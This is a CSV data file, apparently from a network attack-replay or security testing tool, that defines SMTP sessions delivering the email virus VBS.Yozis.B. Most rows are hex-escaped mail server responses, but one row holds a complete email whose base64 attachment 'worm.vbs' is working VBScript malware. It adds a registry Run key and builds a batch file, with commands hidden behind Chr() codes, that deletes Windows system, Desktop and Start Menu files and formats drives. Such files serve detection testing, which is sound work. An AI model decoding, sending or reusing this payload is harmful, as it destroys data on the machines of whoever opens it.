XmlName,ExecDesc,EngDesc,Protocol,SPECProtocol,Payload
VBS.Yozis.B.4716d37a.xml,Email Virus VBS.Yozis.B,This is the email virus VBS.Yozis.B as detected by ClamAV. This email caught by imperfect networks was applied the following hash value for identification: 4716d37a148c503c20213828bccc5028.  This attack is delivered via SMTP to a email server.,SMTP,TCP,250 Accepted[[0d 0a]]
VBS.Yozis.B.4716d37a.xml,Email Virus VBS.Yozis.B,This is the email virus VBS.Yozis.B as detected by ClamAV. This email caught by imperfect networks was applied the following hash value for identification: 4716d37a148c503c20213828bccc5028.  This attack is delivered via SMTP to a email server.,SMTP,TCP,"354 E[[6e ]]ter [[6d ]]essage[[2c ]] e[[6e ]]di[[6e ]]g with ""[[2e ]]"" [[6f 6e ]] a [[6c ]]i[[6e ]]e by itse[[6c ]]f[[0d 0a]]"
VBS.Yozis.B.4716d37a.xml,Email Virus VBS.Yozis.B,This is the email virus VBS.Yozis.B as detected by ClamAV. This email caught by imperfect networks was applied the following hash value for identification: 4716d37a148c503c20213828bccc5028.  This attack is delivered via SMTP to a email server.,SMTP,TCP,250 [[4f 4b ]] id[[3d ]]1HcVW[[6f 2d ]]0007YR[[2d ]]S8
VBS.Yozis.B.4716d37a.xml,Email Virus VBS.Yozis.B,This is the email virus VBS.Yozis.B as detected by ClamAV. This email caught by imperfect networks was applied the following hash value for identification: 4716d37a148c503c20213828bccc5028.  This attack is delivered via SMTP to a email server.,SMTP,TCP,221 f[[6f ]]ster c[[6c 6f ]]si[[6e ]]g c[[6f 6e 6e ]]ecti[[6f 6e 0d 0a]]
﻿VBS.Yozis.B.4716d37a_IPv6.xml,Email Virus VBS.Yozis.B (IPv6 Version),This is the email virus VBS.Yozis.B as detected by ClamAV. This email caught by imperfect networks was applied the following hash value for identification: 4716d37a148c503c20213828bccc5028.  This attack is delivered via SMTP to a email server. (IPv6 Version),SMTP/IPv6,TCP,"Content-Transfer-Encoding: binary[[0A ]]Content-Type: multipart/mixed; boundary=""_----------=_113511269998330""[[0A ]]MIME-Version: 1.0[[0A ]]X-Mailer: MIME::Lite 3.01 (F2.73; A1.67; B3.05; Q3.03)[[0A ]]Date: Tue, 20 Dec 2005 21:04:59 UT[[0A ]]From: phar@example.com[[0A ]]To: victim@example.net[[0A ]]Subject: 'Curiouser and curiouser!' cried Alice.[[0A 0A ]]This is a multi-part message in MIME format.[[0A 0A ]]--_----------=_113511269998330[[0A ]]Content-Disposition: inline[[0A ]]Content-Length: 635[[0A ]]Content-Transfer-Encoding: binary[[0A ]]Content-Type: text/plain[[0A 0A ]]`But I don't want to go among mad people,' Alice remarked.[[0A ]]`Oh, you can't help that,' said the Cat: `we're all mad here. I'm mad.  You're mad.'[[0A ]]`How do you know I'm mad?' said Alice.[[0A ]]`You must be,' said the Cat, `or you wouldn't have come here.'[[0A ]]Alice didn't think that proved it at all; however, she went on` And how do you know that you're mad?'[[0A ]]`To begin with,' said the Cat, `a dog's not mad.  You grant that?'[[0A ]]`I suppose so,' said Alice.[[0A ]]`Well, then,' the Cat went on, `you see, a dog growls when it's angry, and wags its tail when it's pleased.  Now I growl when I'm pleased, and wag my tail [[0A ]]when I'm angry.  Therefore I'm mad.'[[0A ]]--_----------=_113511269998330[[0A ]]Content-Disposition: attachment; filename=""worm.vbs""[[0A ]]Content-Transfer-Encoding: base64[[0A ]]Content-Type: application/octet-stream; name=""worm.vbs""[[0A 0A ]]PFNjcmlwdCBMYW5ndWFnZSA9ICJWQlNjcmlwdCI+DQo8IS0tDQonIEhUTUwu[[0A ]]TWVsaGFja2VyL0JBVC5NZWxoYWNrZXIvVkJTLk1lbGhhY2suREBtbQ0KJyBb[[0A ]]VGhlIFJ1c3NpYW4gTWFuXSAtIFZsYWRpbW9yIENoYW1sa292aWMNCicgaHR0[[0A ]]cDovL3Z4Lm5ldGx1eC5vcmcvfm1lbGhhY2tlciByZWxlYXNlIG9uIDI3IE9j[[0A ]]dG9iZXIgMjAwMg0KJyBUaGlzIHZpcnVzIGNhbiBiZSBmb3VuZCBhdCBteSBv[[0A ]]ZmZpY2lhbCB3ZWJzaXRlLiBUaGlzIHdlYiBmb3IgcGVyc29uYWwgdXNlZCBv[[0A ]]bmx5IGFuZCBub3QgZm9yIGV2ZXJ5b25lLg0KJyBJIHdpbGwgbm90IHJlc3Bv[[0A ]]bnNpYmxlIGNhdXNlIGFueSBkYW1hZ2UgdGhhdCBoYXMgYmVlbiBtYWRlIGJ5[[0A ]]IHRoaXMgdmlydXMuIFRoaXMgdmlydXMgYWxzbyByZWxlYXNlIG9uDQonIDEx[[0A ]]IE5vdmVtYmVyIDIwMDIsIE1vbmRheSwgUnVzc2lhDQpPbiBFcnJvciBSZXN1[[0A ]]bWUgTmV4dA0KSWYgRGF5KE5vdykgPSAxIE9yIERheShOb3cpID0gNCBPciBE[[0A ]]YXkoTm93KSA9IDggT3IgRGF5KE5vdykgPSAxMiBPciBEYXkoTm93KSA9IDE2[[0A ]]IE9yIERheShOb3cpID0gMjAgT3IgRGF5KE5vdykgPSAyNCBPciBEYXkoTm93[[0A ]]KSA9IDI4IFRoZW4NClNldCBXc2hTaGVsbCA9IENyZWF0ZU9iamVjdCgiV1Nj[[0A ]]cmlwdC5TaGVsbCIpDQonV3NoU2hlbGwuUmVnV3JpdGUgIkhLRVlfTE9DQUxf[[0A ]]TUFDSElORVxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVy[[0A ]]c2lvblxSdW4iLCJNZWxoYWNrZXIiLCAiQzpcV2luZG93c1xNZWxoYWNrZXIu[[0A ]]dmJzIg0KV3NoU2hlbGwuUmVnV3JpdGUgIkhLRVlfTE9DQUxfTUFDSElORVxT[[0A ]]T0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxSZWdp[[0A ]]c3RlcmVkT3duZXIiLCAiVmxhZGltb3IgQ2hhbWxrb3ZpYyINCidXc2hTaGVs[[0A ]]bC5SZWdXcml0ZSAiSEtFWV9MT0NBTF9NQUNISU5FXFNPRlRXQVJFXE1pY3Jv[[0A ]]c29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFZlcnNpb24iLCAiTWVsaGFj[[0A ]]a2VyIE9wZXJhdGluZyBTeXN0ZW0iDQpXc2hTaGVsbC5SZWdXcml0ZSAiSEtF[[0A ]]WV9MT0NBTF9NQUNISU5FXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1[[0A ]]cnJlbnRWZXJzaW9uXFJlZ2lzdGVyZWRPcmdhbml6YXRpb24iLCAiTWVsaGFj[[0A ]]a2VyLCBJbmMuIg0KU2V0IEZTTyA9IENyZWF0ZU9iamVjdCgiU2NyaXB0aW5n[[0A ]]LkZpbGVTeXN0ZW1PYmplY3QiKQ0KRGltIE1lbERheQ0KTWVsRGF5ID0gRGF5[[0A ]]KE5vdykNCklmIE1zZ0JveCgiVG8gZGF5IGlzICIgJiBNZWxEYXkgJiAiLiBJ[[0A ]]IHdvdWxkIGxpa2UgdG8ga2lsbCB5b3VyIFBDIHRvZGF5LiBEbyB5b3UgYWdy[[0A ]]ZWUgb3Igbm90PyIsIHZiWWVzTm8gKyAwLCAiTWVsaGFja2VyIFZpcmlpIikg[[0A ]]PSB2Yk5vIFRoZW4NCiAgU2V0IE1lbGhhY2tlciA9IEZTTy5DcmVhdGVUZXh0[[0A ]]RmlsZSgiYzpcV2luZG93c1xzeXNtZWwzMi5leGUuYmF0IiwgMiwgRmFsc2Up[[0A ]]DQogIE1lbGhhY2tlci5Xcml0ZUxpbmUgIiIgJiBDaHIoMTAxKSAmIENocig5[[0A ]]OSkgJiBDaHIoMTA0KSAmIENocigxMTEpICYgIiAiICYgQ2hyKDExMSkgJiBD[[0A ]]aHIoMTAyKSAmIENocigxMDIpICYgIiINCiAgTWVsaGFja2VyLldyaXRlTGlu[[0A ]]ZSAiIiAmIENocig5OSkgJiBDaHIoMTA4KSAmIENocigxMTUpICYgIiINCiAg[[0A ]]TWVsaGFja2VyLldyaXRlTGluZSAiIiAmIENocig1OCkgJiBDaHIoNTgpICYg[[0A ]]IiAiICYgQ2hyKDY2KSAmIENocig2NSkgJiBDaHIoODQpICYgQ2hyKDQ2KSAm[[0A ]]IENocig3NykgJiBDaHIoMTAxKSAmIENocigxMDgpICYgQ2hyKDEwNCkgJiBD[[0A ]]aHIoOTcpICYgQ2hyKDk5KSAmIENocigxMDcpICYgQ2hyKDEwMSkgJiBDaHIo[[0A ]]MTE0KSAmICIiDQogIE1lbGhhY2tlci5Xcml0ZUxpbmUgIiIgJiBDaHIoNzMp[[0A ]]ICYgQ2hyKDEwMikgJiAiICIgJiBDaHIoNjkpICYgQ2hyKDEyMCkgJiBDaHIo[[0A ]]MTA1KSAmIENocigxMTUpICYgQ2hyKDExNikgJiAiICIgJiBDaHIoNjcpICYg[[0A ]]Q2hyKDU4KSAmIENocig5MikgJiBDaHIoODcpICYgQ2hyKDEwNSkgJiBDaHIo[[0A ]]MTEwKSAmIENocigxMDApICYgQ2hyKDExMSkgJiBDaHIoMTE5KSAmIENocigx[[0A ]]MTUpICYgQ2hyKDkyKSAmIENocigxMTUpICYgQ2hyKDEyMSkgJiBDaHIoMTE1[[0A ]]KSAmIENocigxMDkpICYgQ2hyKDEwMSkgJiBDaHIoMTA4KSAmIENocig1MSkg[[0A ]]JiBDaHIoNTApICYgQ2hyKDQ2KSAmIENocigxMDEpICYgQ2hyKDEyMCkgJiBD[[0A ]]aHIoMTAxKSAmIENocig0NikgJiBDaHIoOTgpICYgQ2hyKDk3KSAmIENocigx[[0A ]]MTYpICYgIiAiICYgQ2hyKDEwMykgJiBDaHIoMTExKSAmIENocigxMTYpICYg[[0A ]]Q2hyKDExMSkgJiAiICIgJiBDaHIoNzUpICYgQ2hyKDczKSAmIENocig3Nikg[[0A ]]JiBDaHIoNzYpICYgIiINCiAgTWVsaGFja2VyLldyaXRlTGluZSAiIiAmIENo[[0A ]]cigxMDMpICYgQ2hyKDExMSkgJiBDaHIoMTE2KSAmIENocigxMTEpICYgIiAi[[0A ]]ICYgQ2hyKDcxKSAmIENocig2OSkgJiBDaHIoODQpICYgIiINCiAgTWVsaGFj[[0A ]]a2VyLldyaXRlTGluZSAiIiAmIENocig1OCkgJiBDaHIoNzEpICYgQ2hyKDY5[[0A ]]KSAmIENocig4NCkgJiAiIg0KICBNZWxoYWNrZXIuV3JpdGVMaW5lICIiICYg[[0A ]]Q2hyKDk5KSAmIENocigxMTEpICYgQ2hyKDExMikgJiBDaHIoMTIxKSAmICIg[[0A ]]IiAmIENocigzNykgJiBDaHIoNDgpICYgIiAiICYgQ2hyKDM3KSAmIENocig4[[0A ]]NykgJiBDaHIoMTA1KSAmIENocigxMTApICYgQ2hyKDEwMCkgJiBDaHIoMTA1[[0A ]]KSAmIENocigxMTQpICYgQ2hyKDM3KSAmIENocig5MikgJiBDaHIoMTE1KSAm[[0A ]]IENocigxMjEpICYgQ2hyKDExNSkgJiBDaHIoMTA5KSAmIENocigxMDEpICYg[[0A ]]Q2hyKDEwOCkgJiBDaHIoNTEpICYgQ2hyKDUwKSAmIENocig0NikgJiBDaHIo[[0A ]]MTAxKSAmIENocigxMjApICYgQ2hyKDEwMSkgJiBDaHIoNDYpICYgQ2hyKDk4[[0A ]]KSAmIENocig5NykgJiBDaHIoMTE2KSAmICIgIiAmIENocig2MikgJiBDaHIo[[0A ]]NjIpICYgQ2hyKDc4KSAmIENocig4NSkgJiBDaHIoNzYpICYgIiINCiAgTWVs[[0A ]]aGFja2VyLldyaXRlTGluZSAiIiAmIENocigxMDMpICYgQ2hyKDExMSkgJiBD[[0A ]]aHIoMTE2KSAmIENocigxMTEpICYgIiAiICYgQ2hyKDY3KSAmIENocig3OCkg[[0A ]]JiAiIg0KICBNZWxoYWNrZXIuV3JpdGVMaW5lICIiICYgQ2hyKDU4KSAmIENo[[0A ]]cig3NSkgJiBDaHIoNzMpICYgQ2hyKDc2KSAmIENocig3NikgJiAiIg0KICBN[[0A ]]ZWxoYWNrZXIuV3JpdGVMaW5lICIiICYgQ2hyKDk5KSAmIENocigxMDgpICYg[[0A ]]Q2hyKDExNSkgJiAiIg0KICBNZWxoYWNrZXIuV3JpdGVMaW5lICIiICYgQ2hy[[0A ]]KDEwMCkgJiBDaHIoMTAxKSAmIENocigxMDgpICYgIiAiICYgQ2hyKDY3KSAm[[0A ]]IENocig1OCkgJiBDaHIoOTIpICYgQ2hyKDQyKSAmIENocig0NikgJiBDaHIo[[0A ]]NDIpICYgIiINCiAgTWVsaGFja2VyLldyaXRlTGluZSAiIiAmIENocigxMDAp[[0A ]]ICYgQ2hyKDEwMSkgJiBDaHIoMTA4KSAmICIgIiAmIENocig2NykgJiBDaHIo[[0A ]]NTgpICYgQ2hyKDkyKSAmIENocig3NykgJiBDaHIoMTIxKSAmIENocigxMDAp[[0A ]]ICYgQ2hyKDExMSkgJiBDaHIoOTkpICYgQ2hyKDExNykgJiBDaHIoMTI2KSAm[[0A ]]IENocig0OSkgJiBDaHIoOTIpICYgQ2hyKDQyKSAmIENocig0NikgJiBDaHIo[[0A ]]NDIpICYgIiINCiAgTWVsaGFja2VyLldyaXRlTGluZSAiIiAmIENocigxMDAp[[0A ]]ICYgQ2hyKDEwMSkgJiBDaHIoMTA4KSAmICIgIiAmIENocig2NykgJiBDaHIo[[0A ]]NTgpICYgQ2hyKDkyKSAmIENocig4NykgJiBDaHIoMTA1KSAmIENocigxMTAp[[0A ]]ICYgQ2hyKDEwMCkgJiBDaHIoMTExKSAmIENocigxMTkpICYgQ2hyKDExNSkg[[0A ]]JiBDaHIoOTIpICYgQ2hyKDQyKSAmIENocig0NikgJiBDaHIoNDIpICYgIiIN[[0A ]]CiAgTWVsaGFja2VyLldyaXRlTGluZSAiIiAmIENocigxMDApICYgQ2hyKDEw[[0A ]]MSkgJiBDaHIoMTA4KSAmICIgIiAmIENocig2NykgJiBDaHIoNTgpICYgQ2hy[[0A ]]KDkyKSAmIENocig4NykgJiBDaHIoMTA1KSAmIENocigxMTApICYgQ2hyKDEw[[0A ]]MCkgJiBDaHIoMTExKSAmIENocigxMTkpICYgQ2hyKDExNSkgJiBDaHIoOTIp[[0A ]]ICYgQ2hyKDQyKSAmIENocig0NikgJiBDaHIoNDIpICYgIiINCiAgTWVsaGFj[[0A ]]a2VyLldyaXRlTGluZSAiIiAmIENocigxMDApICYgQ2hyKDEwMSkgJiBDaHIo[[0A ]]MTA4KSAmICIgIiAmIENocig2NykgJiBDaHIoNTgpICYgQ2hyKDkyKSAmIENo[[0A ]]cig4NykgJiBDaHIoMTA1KSAmIENocigxMTApICYgQ2hyKDEwMCkgJiBDaHIo[[0A ]]MTExKSAmIENocigxMTkpICYgQ2hyKDExNSkgJiBDaHIoOTIpICYgIlN5c3Rl[[0A ]]bTMyIiAmIENocig5MikgJiBDaHIoNDIpICYgQ2hyKDQ2KSAmIENocig0Mikg[[0A ]]JiAiIg0KICBNZWxoYWNrZXIuV3JpdGVMaW5lICIiICYgQ2hyKDEwMCkgJiBD[[0A ]]aHIoMTAxKSAmIENocigxMDgpICYgIiAiICYgQ2hyKDY3KSAmIENocig1OCkg[[0A ]]JiBDaHIoOTIpICYgQ2hyKDg3KSAmIENocigxMDUpICYgQ2hyKDExMCkgJiBD[[0A ]]aHIoMTAwKSAmIENocigxMTEpICYgQ2hyKDExOSkgJiBDaHIoMTE1KSAmIENo[[0A ]]cig5MikgJiAiQ3Vyc29yIiAmIENocig5MikgJiBDaHIoNDIpICYgQ2hyKDQ2[[0A ]]KSAmIENocig0MikgJiAiIg0KICBNZWxoYWNrZXIuV3JpdGVMaW5lICIiICYg[[0A ]]Q2hyKDEwMCkgJiBDaHIoMTAxKSAmIENocigxMDgpICYgIiAiICYgQ2hyKDY3[[0A ]]KSAmIENocig1OCkgJiBDaHIoOTIpICYgQ2hyKDg3KSAmIENocigxMDUpICYg[[0A ]]Q2hyKDExMCkgJiBDaHIoMTAwKSAmIENocigxMTEpICYgQ2hyKDExOSkgJiBD[[0A ]]aHIoMTE1KSAmIENocig5MikgJiBDaHIoNDIpICYgQ2hyKDQ2KSAmIENocig0[[0A ]]MikgJiAiIg0KICBNZWxoYWNrZXIuV3JpdGVMaW5lICIiICYgQ2hyKDEwMCkg[[0A ]]JiBDaHIoMTAxKSAmIENocigxMDgpICYgIiAiICYgQ2hyKDY3KSAmIENocig1[[0A ]]OCkgJiBDaHIoOTIpICYgQ2hyKDg3KSAmIENocigxMDUpICYgQ2hyKDExMCkg[[0A ]]JiBDaHIoMTAwKSAmIENocigxMTEpICYgQ2hyKDExOSkgJiBDaHIoMTE1KSAm[[0A ]]IENocig5MikgJiAiRGVza3RvcCIgJiBDaHIoOTIpICYgQ2hyKDQyKSAmIENo[[0A ]]cig0NikgJiBDaHIoNDIpICYgIiINCiAgTWVsaGFja2VyLldyaXRlTGluZSAi[[0A ]]IiAmIENocigxMDApICYgQ2hyKDEwMSkgJiBDaHIoMTA4KSAmICIgIiAmIENo[[0A ]]cig2NykgJiBDaHIoNTgpICYgQ2hyKDkyKSAmIENocig4NykgJiBDaHIoMTA1[[0A ]]KSAmIENocigxMTApICYgQ2hyKDEwMCkgJiBDaHIoMTExKSAmIENocigxMTkp[[0A ]]ICYgQ2hyKDExNSkgJiBDaHIoOTIpICYgIlN0YXJ0IE1lbnUiICYgQ2hyKDky[[0A ]]KSAmIENocig0MikgJiBDaHIoNDYpICYgQ2hyKDQyKSAmICIiDQogIE1lbGhh[[0A ]]Y2tlci5Xcml0ZUxpbmUgIiIgJiBDaHIoMTAwKSAmIENocigxMDEpICYgQ2hy[[0A ]]KDEwOCkgJiAiICIgJiBDaHIoNjcpICYgQ2hyKDU4KSAmIENocig5MikgJiBD[[0A ]]aHIoODcpICYgQ2hyKDEwNSkgJiBDaHIoMTEwKSAmIENocigxMDApICYgQ2hy[[0A ]]KDExMSkgJiBDaHIoMTE5KSAmIENocigxMTUpICYgQ2hyKDkyKSAmICJTdGFy[[0A ]]dCBNZW51IiAmIENocig5MikgJiAiUHJvZ3JhbXMiICYgQ2hyKDkyKSAmIENo[[0A ]]cig0MikgJiBDaHIoNDYpICYgQ2hyKDQyKSAmICIiDQogIE1lbGhhY2tlci5X[[0A ]]cml0ZUxpbmUgIiIgJiBDaHIoMTAzKSAmIENocigxMTEpICYgQ2hyKDExNikg[[0A ]]JiBDaHIoMTExKSAmICIgIiAmIENocig2NykgJiBDaHIoNzgpICYgIiINCiAg[[0A ]]TWVsaGFja2VyLldyaXRlTGluZSAiIiAmIENocig1OCkgJiBDaHIoNjcpICYg[[0A ]]Q2hyKDc4KSAmICIiDQogIE1lbGhhY2tlci5Xcml0ZUxpbmUgIiIgJiBDaHIo[[0A ]]NzApICYgQ2hyKDExMSkgJiBDaHIoMTE0KSAmIENocigxMDkpICYgQ2hyKDk3[[0A ]]KSAmIENocigxMTYpICYgIiAiICYgQ2hyKDY3KSAmIENocig1OCkgJiAiICIg[[0A ]]JiBDaHIoOTIpICYgQ2hyKDExNykgJiAiICIgJiBDaHIoOTIpICYgQ2hyKDEx[[0A ]]MykgJiAiICIgJiBDaHIoOTIpICYgQ2hyKDk3KSAmIENocigxMTcpICYgQ2hy[[0A ]]KDExNikgJiBDaHIoMTExKSAmIENocigxMTYpICYgQ2hyKDEwMSkgJiBDaHIo[[0A ]]MTE1KSAmIENocigxMTYpICYgIiINCiAgTWVsaGFja2VyLldyaXRlTGluZSAi[[0A ]]IiAmIENocig3MCkgJiBDaHIoMTExKSAmIENocigxMTQpICYgQ2hyKDEwOSkg[[0A ]]JiBDaHIoOTcpICYgQ2hyKDExNikgJiAiICIgJiBDaHIoNjUpICYgQ2hyKDU4[[0A ]]KSAmICIgIiAmIENocig5MikgJiBDaHIoMTE3KSAmICIgIiAmIENocig5Mikg[[0A ]]JiBDaHIoMTEzKSAmICIgIiAmIENocig5MikgJiBDaHIoOTcpICYgQ2hyKDEx[[0A ]]NykgJiBDaHIoMTE2KSAmIENocigxMTEpICYgQ2hyKDExNikgJiBDaHIoMTAx[[0A ]]KSAmIENocigxMTUpICYgQ2hyKDExNikgJiAiIg0KICBNZWxoYWNrZXIuV3Jp[[0A ]]dGVMaW5lICIiICYgQ2hyKDEwMykgJiBDaHIoMTExKSAmIENocigxMTYpICYg[[0A ]]Q2hyKDExMSkgJiAiICIgJiBDaHIoNjkpICYgQ2hyKDc4KSAmIENocig2OCkg[[0A ]]JiAiIg0KICBNZWxoYWNrZXIuV3JpdGVMaW5lICIiICYgQ2hyKDU4KSAmIENo[[0A ]]cig2OSkgJiBDaHIoNzgpICYgQ2hyKDY4KSAmICIiDQogIE1lbGhhY2tlci5X[[0A ]]cml0ZUxpbmUgIiIgJiBDaHIoNTgpICYgQ2hyKDU4KSAmICIgIiAmIENocig4[[0A ]]MykgJiBDaHIoMTEyKSAmIENocigxMDEpICYgQ2hyKDk5KSAmIENocigxMDUp[[0A ]]ICYgQ2hyKDk3KSAmIENocigxMDgpICYgIiAiICYgQ2hyKDY2KSAmIENocigx[[0A ]]MjEpICYgIiAiICYgQ2hyKDg2KSAmIENocigxMDgpICYgQ2hyKDk3KSAmIENo[[0A ]]cigxMDApICYgQ2hyKDEwNSkgJiBDaHIoMTA5KSAmIENocigxMTEpICYgQ2hy[[0A ]]KDExNCkgJiAiICIgJiBDaHIoNjcpICYgQ2hyKDEwNCkgJiBDaHIoOTcpICYg[[0A ]]Q2hyKDEwOSkgJiBDaHIoMTA4KSAmIENocigxMDcpICYgQ2hyKDExMSkgJiBD[[0A ]]aHIoMTE4KSAmIENocigxMDUpICYgQ2hyKDk5KSAmICIiDQogIE1lbGhhY2tl[[0A ]]ci5DbG9zZQ0KICBNZWxoYWNrZXIuUnVuDQpFbHNlDQogIEVuZCBJZg0KRWxz[[0A ]]ZQ0KICAgIElmIE1zZ0JveCgiV2VsY29tZSB0byBNZWxoYWNrZXIsIEluYy4g[[0A ]]VGhpcyB3ZWJzaXRlIGNvbnRhaW4gSkFWQVNDUklQVCBhbmQgVkJTQ1JJUFQg[[0A ]]b24gSFRNTCBib2R5LiBJIHdpbGwgbm90IHJlc3BvbnNpYmxlIGNhdXNlIGFu[[0A ]]eSBkYW1hZ2UgIiBfDQogICAgICAgICYgIndoZW4geW91IHZpc2l0IHRoaXMg[[0A ]]d2Vic2l0ZS4gSSByZWNvbW1lbmRlZCB0aGF0IHlvdSBsZWF2ZSBpbW1lZGlh[[0A ]]dGVseSBmcm9tIHRoaXMgd2Vic2l0ZSBiZWNhdXNlIGl0J3MganVzdCBmb3Ig[[0A ]]cGVyc29uYWwgdXNlIG9ubHkuICIgXw0KICAgICAgICAmICJPTkNFIEFHQUlO[[0A ]]IEkgUkVQRUFUIFBMRUFTRSBMRUFWRSBUSElTIFdFQlNJVEUgSU1NRURJQVRM[[0A ]]WSBJRiBZT1UgQVJFIE5PVCBUUlVTVCBBVCBNRS4gQXJlIHN1cmUgdG8gbGVh[[0A ]]dmUgZnJvbSB0aGlzICIgXw0KICAgICAgICAmICJ3ZWIgc2l0ZT8iLCB2Ylll[[0A ]]c05vICsgdmJDcml0aWNhbCwgIk1lbGhhY2tlciwgSW5jLiIpID0gdmJZZXMg[[0A ]]VGhlbiAgDQogICAgRWxzZQ0KICAgICAgICBNc2dCb3ggIk5vdyB5b3UgY2hv[[0A ]]b3NlIE5PLiBBbnkgZGFtYWdlLCB0aGF0J3MgeW91ciBmYXVsdCEiLCB2Yklu[[0A ]]Zm9ybWF0aW9uICsgMCwgIk1lbGhhY2tlciwgSW5jLiINCiAgICBFbmQgSWYN[[0A ]]CkVuZCBJZg0KLS0+DQo8L1NDUklQVD4NCg==[[0A 0A ]]--_----------=_113511269998330--[[0A 0A 0A 0A]]"
VBS.Yozis.B.4716d37a_IPv6.xml,Email Virus VBS.Yozis.B (IPv6 Version),This is the email virus VBS.Yozis.B as detected by ClamAV. This email caught by imperfect networks was applied the following hash value for identification: 4716d37a148c503c20213828bccc5028.  This attack is delivered via SMTP to a email server. (IPv6 Version),SMTP/IPv6,TCP,[[0D 0A ]].[[0D 0A]]
VBS.Yozis.B.4716d37a_IPv6.xml,Email Virus VBS.Yozis.B (IPv6 Version),This is the email virus VBS.Yozis.B as detected by ClamAV. This email caught by imperfect networks was applied the following hash value for identification: 4716d37a148c503c20213828bccc5028.  This attack is delivered via SMTP to a email server. (IPv6 Version),SMTP/IPv6,TCP,QUIT[[0D 0A]]
VBS.Yozis.B.4716d37a_IPv6.xml,Email Virus VBS.Yozis.B (IPv6 Version),This is the email virus VBS.Yozis.B as detected by ClamAV. This email caught by imperfect networks was applied the following hash value for identification: 4716d37a148c503c20213828bccc5028.  This attack is delivered via SMTP to a email server. (IPv6 Version),SMTP/IPv6,TCP,220 f[[6f ]]ster ES[[4d ]]TP[[0d 0a]]
VBS.Yozis.B.4716d37a_IPv6.xml,Email Virus VBS.Yozis.B (IPv6 Version),This is the email virus VBS.Yozis.B as detected by ClamAV. This email caught by imperfect networks was applied the following hash value for identification: 4716d37a148c503c20213828bccc5028.  This attack is delivered via SMTP to a email server. (IPv6 Version),SMTP/IPv6,TCP,250[[2d ]]SI[[5a ]]E 52428800[[0d 0a ]]250[[2d ]]PIPE[[4c ]]I[[4e ]]I[[4e ]]G[[0d 0a ]]250[[2d ]]AUTH P[[4c ]]AI[[4e ]] [[4c 4f ]]GI[[4e 0d 0a]]
VBS.Yozis.B.4716d37a_IPv6.xml,Email Virus VBS.Yozis.B (IPv6 Version),This is the email virus VBS.Yozis.B as detected by ClamAV. This email caught by imperfect networks was applied the following hash value for identification: 4716d37a148c503c20213828bccc5028.  This attack is delivered via SMTP to a email server. (IPv6 Version),SMTP/IPv6,TCP,250 [[4f 4b 0d 0a]]
VBS.Yozis.B.4716d37a_IPv6.xml,Email Virus VBS.Yozis.B (IPv6 Version),This is the email virus VBS.Yozis.B as detected by ClamAV. This email caught by imperfect networks was applied the following hash value for identification: 4716d37a148c503c20213828bccc5028.  This attack is delivered via SMTP to a email server. (IPv6 Version),SMTP/IPv6,TCP,250 Accepted[[0d 0a]]
VBS.Yozis.B.4716d37a_IPv6.xml,Email Virus VBS.Yozis.B (IPv6 Version),This is the email virus VBS.Yozis.B as detected by ClamAV. This email caught by imperfect networks was applied the following hash value for identification: 4716d37a148c503c20213828bccc5028.  This attack is delivered via SMTP to a email server. (IPv6 Version),SMTP/IPv6,TCP,"354 E[[6e ]]ter [[6d ]]essage[[2c ]] e[[6e ]]di[[6e ]]g with ""[[2e ]]"" [[6f 6e ]] a [[6c ]]i[[6e ]]e by itse[[6c ]]f[[0d 0a]]"
VBS.Yozis.B.4716d37a_IPv6.xml,Email Virus VBS.Yozis.B (IPv6 Version),This is the email virus VBS.Yozis.B as detected by ClamAV. This email caught by imperfect networks was applied the following hash value for identification: 4716d37a148c503c20213828bccc5028.  This attack is delivered via SMTP to a email server. (IPv6 Version),SMTP/IPv6,TCP,250 [[4f 4b ]] id[[3d ]]1HcVW[[6f 2d ]]0007YR[[2d ]]S8
VBS.Yozis.B.4716d37a_IPv6.xml,Email Virus VBS.Yozis.B (IPv6 Version),This is the email virus VBS.Yozis.B as detected by ClamAV. This email caught by imperfect networks was applied the following hash value for identification: 4716d37a148c503c20213828bccc5028.  This attack is delivered via SMTP to a email server. (IPv6 Version),SMTP/IPv6,TCP,221 f[[6f ]]ster c[[6c 6f ]]si[[6e ]]g c[[6f 6e 6e ]]ecti[[6f 6e 0d 0a]]
